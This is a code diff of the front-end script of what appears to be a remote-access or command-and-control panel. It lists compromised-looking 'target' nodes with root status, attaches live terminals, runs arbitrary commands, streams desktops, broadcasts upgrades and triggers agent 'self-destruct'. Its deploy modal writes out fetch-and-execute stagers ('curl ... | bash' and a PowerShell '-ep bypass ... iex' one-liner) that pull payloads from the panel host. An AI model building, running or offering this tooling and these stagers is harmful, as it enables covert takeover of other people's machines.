-  function toggleAudio() {
-    audioEnabled = !audioEnabled;
-    document.getElementById('audio-toggle-btn').innerText = audioEnabled ? '🔊 AUDIO ON' : '🔇 AUDIO';
-    if(audioEnabled) playBeep(880, 0.08);
-  }
-
-  function toggleScanlines() {
-    const el = document.getElementById('scanlines-el');
-    el.style.display = el.style.display === 'none' ? 'block' : 'none';
-  }
-
-  // DATA REFRESH
+  // REFRESH DATA
   async function refreshData() {
-    playBeep(900, 0.03);
     try {
       const [resNodes, resStats] = await Promise.all([
         fetch('/api/v1/nodes'),
@@ -741,9 +686,9 @@
   }
 
   function renderNodes() {
-    const container = document.getElementById('node-list-container');
+    const container = document.getElementById('node-rows-container');
     container.innerHTML = '';
-    const search = document.getElementById('search-input').value.toLowerCase();
+    const search = document.getElementById('search-box').value.toLowerCase();
     
     let onlineCount = 0;
     nodes.forEach(n => {
@@ -751,6 +696,7 @@
     });
     document.getElementById('h-online-count').innerText = onlineCount;
     document.getElementById('h-total-count').innerText = nodes.length;
+    document.getElementById('roster-total').innerText = `[${nodes.length} NODES]`;
 
     const filtered = nodes.filter(n => {
       if (activeFilter === 'online' && !n.is_online) return false;
@@ -760,28 +706,25 @@
     });
 
     filtered.forEach(n => {
-      const card = document.createElement('div');
-      card.className = 'node-card' + (selectedNode && selectedNode.id === n.id ? ' active' : '');
-      card.onclick = () => selectNode(n);
+      const row = document.createElement('div');
+      row.className = 'node-row' + (selectedNode && selectedNode.id === n.id ? ' active' : '');
+      row.onclick = () => selectNode(n);
       
-      const statusClass = n.is_online ? 'online' : (n.last_seen_sec < 60 ? 'stale' : '');
-      const userBadge = n.is_root ? '<span class="badge-root">root #</span>' : `<span class="badge-user">${n.username || 'user'} $</span>`;
+      const statusText = n.is_online ? '<span class="status-on">[ONLINE]</span>' : '<span class="status-off">[OFFLINE]</span>';
+      const userBadge = n.is_root ? '<span class="badge-root">root #</span>' : `${n.username || 'user'} $`;
       
-      card.innerHTML = `
-        <div class="card-top">
-          <div class="card-id-group">
-            <span class="card-slot">#${n.slot || 1}</span>
-            <span class="card-name">${n.hostname || n.id}</span>
-          </div>
-          <div class="status-dot ${statusClass}"></div>
+      row.innerHTML = `
+        <div class="row-top">
+          <div><span class="row-slot">#${n.slot || 1}</span><span class="row-id">${n.hostname || n.id}</span></div>
+          <div class="row-status">${statusText}</div>
         </div>
-        <div class="card-mid">
+        <div class="row-bot">
           <span>${n.ip || '0.0.0.0'}</span>
           <span>${userBadge}</span>
           <span>${n.ping_ms || 0}ms</span>
         </div>
       `;
-      container.appendChild(card);
+      container.appendChild(row);
     });
 
     if (!selectedNode && filtered.length > 0) {
@@ -791,16 +734,15 @@
 
   function selectNode(n) {
     selectedNode = n;
-    playBeep(700, 0.04);
-    document.getElementById('active-target-info').innerText = `TARGET: [${n.hostname || n.id}] (${n.ip}) [SLOT #${n.slot || 1}]`;
-    document.querySelectorAll('.node-card').forEach(c => c.classList.remove('active'));
+    document.getElementById('target-indicator').innerText = `TARGET: [${n.hostname || n.id}] // SLOT #${n.slot || 1} (${n.ip})`;
+    document.querySelectorAll('.node-row').forEach(c => c.classList.remove('active'));
     renderNodes();
     attachTerminal(n.id);
   }
 
   function setFilter(f) {
     activeFilter = f;
-    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.filter-tab').forEach(b => b.classList.remove('active'));
     event.target.classList.add('active');
     renderNodes();
   }
@@ -811,40 +753,39 @@
 
   // TABS
   function switchTab(tabId) {
-    playBeep(800, 0.03);
-    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.querySelectorAll('.w-tab').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(c => c.classList.remove('active'));
     event.target.classList.add('active');
     document.getElementById(tabId).classList.add('active');
 
-    if (tabId === 'tab-stream' && selectedNode) {
+    if (tabId === 'pane-stream' && selectedNode) {
       const port = selectedNode.webrtc_port || (1984 + (selectedNode.slot || 1) - 1);
-      const vp = document.getElementById('stream-viewport');
+      const vp = document.getElementById('stream-box');
       vp.innerHTML = `<video-stream src="http://${window.location.hostname}:${port}/api/ws?src=desktop_slot_${selectedNode.slot || 1}"></video-stream>`;
     }
   }
 
-  // PTY TERMINAL WS
+  // PTY TERMINAL
   function attachTerminal(nodeId) {
     if (termWS) {
       termWS.close();
       termWS = null;
     }
-    const container = document.getElementById('term-container');
-    container.innerText = `[*] Connecting PTY to node [${nodeId}]...\n`;
+    const screen = document.getElementById('terminal-screen');
+    screen.innerText = `[*] Connecting PTY to [${nodeId}]...\n`;
     
     const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     termWS = new WebSocket(`${wsProto}//${window.location.host}/ws/terminal?node=${nodeId}`);
     
     termWS.onopen = () => {
-      container.innerText += `[+] PTY WebSocket attached. Interactive terminal ready.\n`;
+      screen.innerText += `[+] PTY session established.\n`;
     };
     termWS.onmessage = (e) => {
-      container.innerText += e.data;
-      container.scrollTop = container.scrollHeight;
+      screen.innerText += e.data;
+      screen.scrollTop = screen.scrollHeight;
     };
     termWS.onclose = () => {
-      container.innerText += `\n[-] Terminal session closed.`;
+      screen.innerText += `\n[-] Session detached.`;
     };
   }
 
@@ -855,11 +796,10 @@
   }
 
   function clearTerminal() {
-    document.getElementById('term-container').innerText = '';
+    document.getElementById('terminal-screen').innerText = '';
   }
 
-  // TERMINAL KEYBOARD HOOK
-  document.getElementById('term-container').addEventListener('keydown', (e) => {
+  document.getElementById('terminal-screen').addEventListener('keydown', (e) => {
     if (!termWS || termWS.readyState !== WebSocket.OPEN) return;
     if (e.key === 'Backspace') {
       sendTerminalKey('\x7f');
@@ -882,11 +822,10 @@
   // RPC EXEC
   async function executeRPC() {
     if (!selectedNode) return;
-    const cmd = document.getElementById('rpc-cmd').value.trim();
+    const cmd = document.getElementById('rpc-input-cmd').value.trim();
     if (!cmd) return;
-    playBeep(1000, 0.05);
-    const out = document.getElementById('rpc-output');
-    out.innerText = `[*] Executing: ${cmd} ...\n`;
+    const log = document.getElementById('rpc-log-viewer');
+    log.innerText = `[*] Executing: ${cmd} ...\n`;
     try {
       const res = await fetch(`/api/v1/nodes/${selectedNode.id}/exec`, {
         method: 'POST',
@@ -894,46 +833,46 @@
         body: JSON.stringify({cmd: cmd})
       });
       const data = await res.json();
-      out.innerText = data.output || JSON.stringify(data, null, 2);
+      log.innerText = data.output || JSON.stringify(data, null, 2);
     } catch(err) {
-      out.innerText = `[-] Error: ${err.message}`;
+      log.innerText = `[-] RPC Error: ${err.message}`;
     }
   }
 
-  // NODE MAINTENANCE
+  // NODE OPS
   async function pingTarget() {
     if (!selectedNode) return;
-    const out = document.getElementById('ops-output');
-    out.innerText = `[*] Sending latency probe to [${selectedNode.id}]...\n`;
+    const log = document.getElementById('ops-log-viewer');
+    log.innerText = `[*] Probing RTT latency to [${selectedNode.id}]...\n`;
     const t0 = performance.now();
     try {
       await fetch(`/api/v1/nodes/${selectedNode.id}/ping`, {method: 'POST'});
       const dt = (performance.now() - t0).toFixed(1);
-      out.innerText += `[+] Pong received in ${dt} ms.`;
+      log.innerText += `[+] Pong received in ${dt} ms.`;
     } catch(e) {
-      out.innerText += `[-] Ping failed: ${e.message}`;
+      log.innerText += `[-] Ping failed: ${e.message}`;
     }
   }
 
   async function updateTarget() {
     if (!selectedNode) return;
-    const out = document.getElementById('ops-output');
-    out.innerText = `[*] Dispatched remote self-upgrade for [${selectedNode.id}]...\n`;
+    const log = document.getElementById('ops-log-viewer');
+    log.innerText = `[*] Dispatched binary upgrade on node [${selectedNode.id}]...\n`;
     try {
       const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
       const data = await res.text();
-      out.innerText += data;
+      log.innerText += data;
     } catch(e) {
-      out.innerText += `[-] Update failed: ${e.message}`;
+      log.innerText += `[-] Update failed: ${e.message}`;
     }
   }
 
   async function updateAllNodes() {
-    if (!confirm('Broadcast remote upgrade to ALL online nodes?')) return;
+    if (!confirm('Broadcast upgrade to all registered nodes?')) return;
     try {
       const res = await fetch('/api/v1/nodes/update_all', {method: 'POST'});
       const data = await res.json();
-      alert(`Mass upgrade dispatched: ${JSON.stringify(data)}`);
+      alert(`Upgrade dispatched: ${JSON.stringify(data)}`);
     } catch(e) {
       alert(`Error: ${e.message}`);
     }
@@ -941,56 +880,75 @@
 
   async function uninstallTarget() {
     if (!selectedNode) return;
-    if (!confirm(`Self-destruct and wipe agent on [${selectedNode.id}]?`)) return;
+    if (!confirm(`Self-destruct agent on [${selectedNode.id}]?`)) return;
     try {
       await fetch(`/api/v1/nodes/${selectedNode.id}/uninstall`, {method: 'POST'});
       alert(`Uninstall dispatched on node ${selectedNode.id}`);
       refreshData();
     } catch(e) {
-      alert(`Uninstall error: ${e.message}`);
+      alert(`Error: ${e.message}`);
     }
   }
 
   // DEPLOY MODAL
   function openDeployModal() {
-    playBeep(900, 0.04);
     const host = window.location.host;
-    document.getElementById('snip-agent').innerText = `curl -s http://${host}/i | bash`;
-    document.getElementById('snip-m4r').innerText = `curl -s http://${host}/m4r | bash`;
-    document.getElementById('snip-win').innerText = `powershell -ep bypass -c "iwr -useb http://${host}/m4r.ps1 | iex"`;
+    document.getElementById('cmd-agent').innerText = `curl -s http://${host}/i | bash`;
+    document.getElementById('cmd-m4r').innerText = `curl -s http://${host}/m4r | bash`;
+    document.getElementById('cmd-win').innerText = `powershell -ep bypass -c "iwr -useb http://${host}/m4r.ps1 | iex"`;
     document.getElementById('deploy-modal').classList.add('open');
   }
   function closeDeployModal() {
     document.getElementById('deploy-modal').classList.remove('open');
   }
 
-  // MATRIX / CYBER BACKGROUND CANVAS
-  const canvas = document.getElementById('bg-canvas');
+  // ASCII WAVE ANIMATION (SHIMMERING WAVE SYMBOLS: ~, ^, *, +, :, -)
+  const canvas = document.getElementById('ascii-canvas');
   const ctx = canvas.getContext('2d');
-  let width, height;
+  let w, h;
   function resizeCanvas() {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
   }
   window.addEventListener('resize', resizeCanvas);
   resizeCanvas();
 
-  const cols = Math.floor(window.innerWidth / 20);
-  const drops = Array(cols).fill(1);
-  function drawCanvas() {
-    ctx.fillStyle = 'rgba(6, 9, 14, 0.1)';
-    ctx.fillRect(0, 0, width, height);
-    ctx.fillStyle = '#00ff88';
-    ctx.font = '12px monospace';
-    for (let i = 0; i < drops.length; i++) {
-      const char = String.fromCharCode(33 + Math.floor(Math.random() * 94));
-      ctx.fillText(char, i * 20, drops[i] * 20);
-      if (drops[i] * 20 > height && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
+  const waveChars = ['~', '^', '*', '+', ':', '-', '=', '.', '░', '▒'];
+  let t = 0;
+  function drawWave() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = '#ff0033';
+    ctx.font = '11px monospace';
+    
+    const stepX = 18;
+    const stepY = 22;
+    const cols = Math.floor(w / stepX);
+    const rows = Math.floor(h / stepY);
+
+    for (let r = 0; r < rows; r++) {
+      for (let c = 0; c < cols; c++) {
+        const wave = Math.sin(c * 0.18 + t) + Math.cos(r * 0.22 + t * 0.8);
+        if (wave > 0.4) {
+          const charIdx = Math.floor(Math.abs(wave) * waveChars.length) % waveChars.length;
+          ctx.fillText(waveChars[charIdx], c * stepX, r * stepY);
+        }
+      }
     }
-    requestAnimationFrame(drawCanvas);
+    t += 0.035;
+    requestAnimationFrame(drawWave);
   }
-  drawCanvas();
+  drawWave();
+
+  // KEYBOARD SHORTCUTS (1..5)
+  window.addEventListener('keydown', (e) => {
+    if (document.activeElement && (document.activeElement.tagName === 'INPUT' || document.activeElement.id === 'terminal-screen')) return;
+    if (e.key === '1') switchTab('pane-term');
+    if (e.key === '2') switchTab('pane-rpc');
+    if (e.key === '3') switchTab('pane-stream');
+    if (e.key === '4') switchTab('pane-files');
+    if (e.key === '5') switchTab('pane-ops');
+  });
 
   // INIT
   refreshData();
